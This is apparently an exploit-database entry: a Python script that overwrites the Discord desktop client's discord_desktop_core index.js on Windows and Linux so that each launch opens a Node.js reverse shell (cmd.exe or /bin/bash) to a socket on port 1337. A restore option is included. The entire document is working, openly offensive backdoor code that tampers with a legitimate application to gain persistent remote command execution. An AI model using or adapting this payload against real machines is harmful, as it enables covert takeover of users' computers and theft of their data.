# Exploit Title: Discord Arbitrary Code Execution
# Date: 27-04-2020
# Exploit Author: malwrcoffee
# Vendor Homepage: https://discordapp.com/
# Version: 0.0.306
# Tested on: Windows 10 and Pop!_OS
# CVE : N/A
import os 
import sys
import re
banner = '''
   ( (
    ) )
  ........
  |      |]
  \      /    
   `----'
'''
try:
    arg = sys.argv[1]
except:
    arg = None
print(banner)
print("[*]If you want to restore the original file do, python3 exploit.py restore")
if os.name == "nt":
    print("[X] Windows detected!")
    discordRegXp = re.compile(r'discord_desktop_core')
    discordPath = os.environ['APPDATA'] + "\\Discord\\"
    if(arg == "restore"):
        payload = '''module.exports = require('./core.asar');'''
    else:
        payload = '''
module.exports = require('./core.asar');
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(1337, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
'''
    
    payload = str.encode(payload)
    for dir, subdir, file in os.walk(discordPath):
        for x in file:
            if x == "index.js":
                if discordRegXp.search(os.path.join(dir, x)):
                    open(os.path.join(dir, x), "wb").write(payload)
                    print("Sucessfully wrote payload to {}".format(dir + "\\" + x))



if os.name == "posix":
    print("[X] Linux detected!")
    discordRegXp = re.compile(r'discord_desktop_core')
    discordPath = os.getenv("HOME") + "/" + ".config/discord/"
    if(arg == "restore"):
        payload = '''module.exports = require('./core.asar');'''
    else:
        payload = '''
module.exports = require('./core.asar');
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(1337, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();'''
    payload = str.encode(payload)
    for dir, subdir, file in os.walk(discordPath):
        for x in file:
            if x == "index.js":
                if discordRegXp.search(os.path.join(dir, x)):
                    open(os.path.join(dir, x), "wb").write(payload)
                    print("Sucessfully wrote payload to {}".format(dir + "/" + x))
